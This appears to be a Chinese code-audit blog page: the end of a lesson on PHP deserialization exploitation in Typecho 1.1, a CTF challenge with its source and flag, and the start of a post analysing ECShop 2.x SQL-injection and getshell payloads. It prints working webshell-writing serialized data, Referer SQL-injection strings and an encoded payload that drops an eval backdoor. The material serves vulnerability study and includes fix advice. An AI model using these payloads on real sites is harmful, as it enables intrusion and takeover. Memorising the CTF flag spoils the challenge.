<p>在PHP源码var_unserializer.c，对反序列化字符串进行处理，在代码568行对字符进行判断，并调用相应的函数进行处理，当字符为’O’时，调用 <strong>yy13</strong> 函数，在 <strong>yy13</strong> 函数中，对‘O‘字符的下一个字符进行判断，如果是’:’,则调用 <strong>yy17</strong> 函数,如果不是则调用 <strong>yy3</strong> 函数,直接return 0，结束反序列化。接着看 <strong>yy17</strong> 函数。通过观察yybm[]数组可知，第一个if判断是否为数字，如果为数字则跳转到 <strong>yy20</strong> 函数，第二个判断如果是’+’号则跳转到 <strong>yy19</strong> ，在 <strong>yy19</strong> 中，继续对 <strong>+号</strong> 后面的字符进行判断，如果为数字则跳转到 <strong>yy20</strong> ,如果不是则跳转到 <strong>yy18</strong> ， <strong>y18</strong> 最终跳转到 <strong>yy3</strong> ，退出反序列化流程。由此，在’O:’,后面可以增加’+’，用来绕过正则判断。</p>
<p>绕过了过滤以后，接下来考虑怎样对反序列化进行利用，反序列化本质是将序列化的字符串还原成对应的类实例，在该过程中，我们可控的是序列化字符串的内容，也就是对应类中变量的值。我们无法直接调用类中的函数，但PHP在满足一定的条件下，会自动触发一些函数的调用，该类函数，我们称为魔术方法。通过可控的类变量，触发自动调用的魔术方法，以及魔术方法中存在的可利用点，进而形成反序列化漏洞的利用。</p>
<p>在代码31行，对象销毁时会调用 <strong>createCache()</strong> 函数，函数将 <code>$template</code> 中的内容放到了 <code>$cacheFile</code> 对应的文件中。 <strong>file_put_contents()</strong> 函数，当文件不存在时，会创建该文件。由此可构造一句话，写入当前路径。</p>
<p> <code>$cacheFile</code> 和 <code>$template</code> 为类变量，反序列化可控，由此，构造以下反序列化内容，别忘了加’+’号</p>
<p><img src="/img/PHP-Audit-Labs/Day11/5.png" alt="5"></p>
<p>放入cookie需进行URL编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:+<span class="number">8</span>:<span class="string">"Template"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"cacheFile"</span>;s:<span class="number">10</span>:<span class="string">"./test.php"</span>;s:<span class="number">8</span>:<span class="string">"template"</span>;s:<span class="number">25</span>:<span class="string">"&lt;?php eval($_POST[xx]);?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>文件成功写入：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/6.png" alt="6"></p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>本次实例分析，选取的是 <strong>Typecho-1.1</strong> 版本，在该版本中，用户可通过反序列化Cookie数据进行前台Getshell。该漏洞出现于 <strong>install.php</strong> 文件 <strong>230行</strong> ，具体代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/7.png" alt="7"></p>
<p>在上图代码 <strong>第3行</strong> ，对Cookie中的数据base64解码以后，进行了反序列化操作，该值可控，接下来看一下代码触发条件。文件几个关键判断如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/8.png" alt="8"></p>
<p>第一个if判断，可通过GET传递 <strong>finish=任意值</strong> 绕过 ，第二if判断是否有GET或者POST传参，并判断Referer是否为空，第四个if判断Referer是否为本站点。紧接着还有判断，如下图：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/9.png" alt="9"></p>
<p>第一个if判断 <strong>$_GET[‘finish’]</strong> 是否设置，然后判断 <strong>config.inc.php文件</strong> 是否存在，安装后已存在，第三个判断cookie中 <strong>__typecho_config</strong> 参数是否为空，不为空。进入else分支。综上，具体构造如下图：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/10.png" alt="10"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br></pre></td></tr></table></figure>
<p>反序列化结果存储到 <strong>$config</strong> 变量中，然后将 <strong>$config[‘adapter’]</strong> 和 <strong>$config[‘prefix’]</strong> 作为 <strong>Typecho_Db</strong> 类的初始化变量创建类实例。我们可以在 <strong>var/Typecho/Db.php</strong> 文件中找到该类构造函数代码，具体如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/11.png" alt="11"></p>
<p>上图代码 <strong>第6行</strong> ，对传入的 <strong>$adapterName</strong> 变量进行了字符串拼接操作，对于PHP而言，如果 <strong>$adapterName</strong> 类型为对象，则会调用该类 <strong>__toString()</strong> 魔术方法。可作为反序列化的一个触发点，我们全局搜索一下 <strong>__toString()</strong> ，查看是否有可利用的点。实际搜索时，会发现有三个类都定义了 <strong>__toString()</strong> 方法：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/19.png" alt="19"></p>
<ul>
<li><p>第一处 <strong>var\Typecho\Config.php</strong>：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/12.png" alt="12"></p>
<p>调用 <strong>serialize()</strong> 函数进行序列化操作，会自动触发 <strong>__sleep()</strong> ，如果存在可利用的 <strong>__sleep()</strong> ，则可以进一步利用。</p>
</li>
<li><p>第二处 <strong>var\Typecho\Db\Query.php</strong>：<br><img src="/img/PHP-Audit-Labs/Day11/13.png" alt="13"></p>
<p>该方法用于构建SQL语句，并没有执行数据库操作，所以暂无利用价值。</p>
</li>
<li><p>第三处<strong>var\Typecho\Feed.php</strong>：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/14.png" alt="14"></p>
<p>在代码 <strong>19行</strong> ， <strong>$this-&gt;_items</strong> 为类变量，反序列化可控，在代码 <strong>27行</strong> ， <strong>$item[‘author’]-&gt;screenName</strong> ，如果 <strong>$item[‘author’]</strong> 中存储的类没有’screenName’属性或该属性为私有属性，此时会触发该类中的 <strong>__get()</strong> 魔法方法，这个可作为进一步利用的点，继续往下看代码，未发现有危险函数的调用。</p>
</li>
</ul>
<p>记一波魔术方法及对应的触发条件，具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>
<p>在 <strong>var/Typecho/Request.php</strong> 的  <strong>Typecho_Request</strong> 类中，我们发现 <strong>__get()</strong> 方法，跟踪该方法的调用，具体如下图：<img src="/img/PHP-Audit-Labs/Day11/15.png" alt="15"></p>
<p> <strong>array_map()</strong> 函数和 <strong>call_user_func</strong> 函数，都可以作为利用点，<strong>$filter</strong> 作为调用函数，<strong>$value</strong> 为函数参数，跟踪变量,看一下是否可控。这两个变量都来源于类变量，反序列化可控。从上面的分析中，可知当 <strong>$item[‘author’]</strong> 满足一定条件会触发 <strong>__get</strong> 方法。</p>
<p>假设 <strong>$item[‘author’]</strong> 中存储 <strong>Typecho_Request</strong> 类实例，此时调用 <strong>$item[‘author’]-&gt;screenName</strong> ，在<strong>Typecho_Request</strong> 类中没有该属性，就会调用类中的 <strong>__get($key)</strong> 方法，<strong>$key</strong> 传入的值为 <strong>scrrenName</strong> 。参数传递过程如下：<code>$key=&#39;scrrenName&#39;</code>=&gt;<code>$this-&gt;_param[$key]</code>=&gt;<code>$value</code></p>
<p>我们将 <strong>$this-&gt;_param[‘scrrenName’]</strong> 的值设置为想要执行的函数，构造 <strong>$this-&gt;_filter</strong> 为对应函数的参数值，具体构造如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/16.png" alt="16"></p>
<p>接下来我们去看一下 <strong>Typecho_Feed</strong> 类的构造，该类在 <strong>var/Typecho/Feed.php</strong> 文件中，代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/14.png" alt="14"></p>
<p>上图代码 <strong>第7行</strong> ，满足 <strong>self::RSS2</strong> 与 <strong>$this-&gt;_type</strong> 相等进入该分支，所以 <strong>$this-&gt;_type</strong> 需要构造，<strong>item[‘author’]</strong> 为触发点，需要构造 <strong>$this_items</strong> ，具体构造如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/17.png" alt="17"></p>
<p>代码 <strong>22行</strong> 在实际利用没必要添加，install.php在代码 <strong>54行</strong> 调用 <strong>ob_start()</strong> 函数，该函数对输出内容进行缓冲,反序列化漏洞利用结束后，在<strong>var\Typecho\Db.php</strong>代码121行，触发异常，在 <strong>var\Typecho\Common.php</strong> 代码237行调用 <strong>ob_end_clean()函数</strong> 清除了缓冲区内容，导致无法看见执行结果，考虑在进入到异常处理前提前报错结束程序。由此构造该数据。执行结果如下： </p>
<p><img src="/img/PHP-Audit-Labs/Day11/18.png" alt="18"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>造成该漏洞的原因主要有两点：</p>
<ul>
<li>当 <strong>config.inc.php</strong> 文件存在的时，可绕过判断继续往下执行代码。</li>
<li>传入反序列化函数的参数可控</li>
</ul>
<p>修复方法：在 <strong>install.php</strong> 文件第一行判断 <strong>config.inc.php</strong> 是否存在，如果存在，则退出代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (file_exists(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/config.inc.php'</span>))</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对反序列化利用有了一定的了解，文中用到的CMS可以从 <a href="https://github.com/typecho/typecho/archive/v1.1-15.5.12-beta.zip" target="_blank" rel="noopener">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:hongrisec@gmail.com" target="_blank" rel="noopener">hongrisec@gmail.com</a> 联系我们。<strong>Day11</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"DROP TABLE IF  EXISTS  users"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, md5($password));</span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            define(<span class="string">'IN_FLAG'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadData($obj-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;__die(<span class="string">"sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $db_host = <span class="string">'localhost'</span>;</span><br><span class="line">    $db_name = <span class="string">'test'</span>;</span><br><span class="line">    $db_user = <span class="string">'root'</span>;</span><br><span class="line">    $db_pass = <span class="string">'123'</span>;</span><br><span class="line">	$DEBUG = <span class="string">'xx'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!defined(<span class="string">'IN_FLAG'</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;un3eri@liz3_i3_s0_fun&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/10/关于ECShop前台注入和getshell漏洞的一些思考/">关于ECShop前台注入和getshell漏洞的一些思考</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-10
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近爆出的ECShop的两个漏洞很火，本篇文章就网络上爆出的payload进行分析，并记录其中自己的一些思考，具体的漏洞不会详细分析，因为这类分析文章已经有很多了，如果你想了解，可以看结尾处的相关文章。</p>
<h3 id="ECShop2-x"><a href="#ECShop2-x" class="headerlink" title="ECShop2.x"></a>ECShop2.x</h3><p>下面以2.7.3版本为例，我们先来看网络上最早爆出来 <strong>注入的payload</strong> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>这个payload还原回去，对应的SQL语句如下：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/1.png" alt="1"></p>
<p>然而这种payload有点鸡肋，因为在版本稍微高一点的mysql中， <strong>procedure analyse</strong> 语句中不能再跟 <strong>select</strong> 语句。看 <strong>P牛</strong> 转载的 <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">这篇</a>文章中，mysql版本为 <strong>5.5.41-0ubuntu0.14.04.1</strong> ，是可以跟 <strong>select</strong> 语句的：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/2.png" alt="2"></p>
<p>而我用 <strong>phpstudy</strong> 中mysql版本为 <strong>5.5.53</strong> ，使用该语句却爆语法错误：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/3.png" alt="3"></p>
<p>所以猜测应该是和版本有关，或者说 <strong>procedure analyse</strong> 语句还有其他的注入写法，知道的师傅还请告诉我：)</p>
<p>既然这种 <strong>payload</strong> 不能爆出表名、列名，我们就要换个思路。仔细观察 <strong>ECShop</strong> 存在注入处的源码，实际上可控制的拼接参数有两个，分别是： <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> ，所以我们大可在 <strong>$arr[‘id’]</strong> 处注入 <strong>payload</strong> (这里直接用 <strong>#</strong> 号)，直接注释掉后面的 <strong>ORDER BY</strong> 语句。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/4.png" alt="4"></p>
<p>所以我构造的 <strong>payload</strong> 如下，可以成功爆出表名和列名：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:3:"669";s:2:"id";s:133:"1' and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#";&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/5.png" alt="5"></p>
<p>当然，同时利用 <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> 两个参数，引入 <strong>/**/</strong> 将 <strong>ORDER BY</strong> 语句注释掉也是可以的：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:2:"id";s:4:"' /*";s:3:"num";s:132:"*/ and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)";&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/6.png" alt="6"></p>
<p>再来看 <strong>命令执行的payload</strong> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure>
<p>当中的16进制对应字符串如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$asd<span class="string">'];assert(base64_decode('</span>ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp<span class="string">'));//&#125;xxx</span></span><br></pre></td></tr></table></figure>
<p>这个命令执行的关键点，还是利用了之前的注入点，同样引入了 <strong>/**/</strong> 将 <strong>ORDER BY</strong> 语句给注释掉。当中，payload会经过 <strong>includes/cls_template.php</strong> 文件的这条语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br></pre></td></tr></table></figure>
<p>这里的 <strong>preg_replace</strong> 使用了危险的 <strong>/e</strong> 模式，而第二个参数中的 <strong>\1</strong> 实际表示的是下图绿色部分字符串：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/7.png" alt="7"></p>
<p>对于正则中的 <strong>\1</strong> 不熟悉的话，可以参考 <a href="https://mochazz.github.io/2018/08/13/深入研究preg_replace与代码执行/">这篇</a> 文章。之后程序的流程就如下调用：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/8.png" alt="8"></p>
